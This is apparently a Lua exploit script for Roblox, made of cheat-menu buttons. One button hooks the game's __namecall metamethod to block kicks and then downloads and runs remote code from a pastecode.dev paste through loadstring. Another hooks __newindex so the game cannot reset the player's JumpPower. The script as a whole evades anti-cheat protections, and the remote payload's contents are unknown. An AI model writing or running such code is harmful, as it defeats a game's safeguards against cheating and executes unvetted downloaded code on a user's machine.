MoreSection:NewButton("Bypasses & Anti-cheats", "an anti", function()-- anti bit detektion
local X;
X = hookmetamethod(game, "__namecall",function(self,...)
local args = {...};
local method = getnamecallmethod()
if method == "Kick"   then
return
end
return X(self,...)
end);
wait()
loadstring(game:HttpGet("https://pastecode.dev/raw/nZaPtHFa5p/lollypop5ever_lulaslollipop",true))()
end)

MoreSection:NewButton("Anti for jumppower", "nojumpkooldown", function()
local IsA = game.IsA
local newindex = nil

newindex = hookmetamethod(game, "__newindex", function(self, Index, Value)
if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then
return
end
return newindex(self, Index, Value)
end)
end)

